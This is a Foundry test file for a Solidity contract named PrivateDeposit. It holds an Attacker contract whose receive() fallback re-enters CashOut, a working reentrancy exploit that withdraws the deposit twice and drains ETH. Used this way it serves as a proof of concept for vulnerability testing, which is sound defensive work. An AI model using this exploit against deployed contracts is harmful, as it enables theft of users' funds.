
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PrivateDeposit} from "../src/PrivateDeposit.sol";

contract TestReentrancyPrivateDeposit is Test {
    
    PrivateDeposit public _contractUnderTest;
    
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new PrivateDeposit();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether && attackVal < type(uint128).max);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state required other than funding.

        // --- 3. Funding ---
        // A. Fund the Victim (so it has ETH to steal)
        vm.deal(address(_contractUnderTest), attackVal * 10); 
        
        // C. CRITICAL: Fund the Test Contract (address(this))
        vm.deal(address(this), attackVal);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    
    PrivateDeposit public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = PrivateDeposit(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 1;
        exploitSucceeded = false;
        attackAmount = val;
        
        // Deposit funds to pass the initial balance check
        victim.Deposit{value: val}();
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State.
        initialSnapshot = address(this).balance;

        // 3. Call the vulnerable function.
        victim.CashOut(val);

        // 4. Verify Success Conditions.
        // If the attack succeeded, we should have withdrawn 'val' twice.
        // Current balance should be greater than what we would have with a single withdrawal.
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {            
            attackCallCount++;
            // Re-enter the contract using the stored Fuzz/Symbolic value.
            victim.CashOut(attackAmount);
        }
    }
}
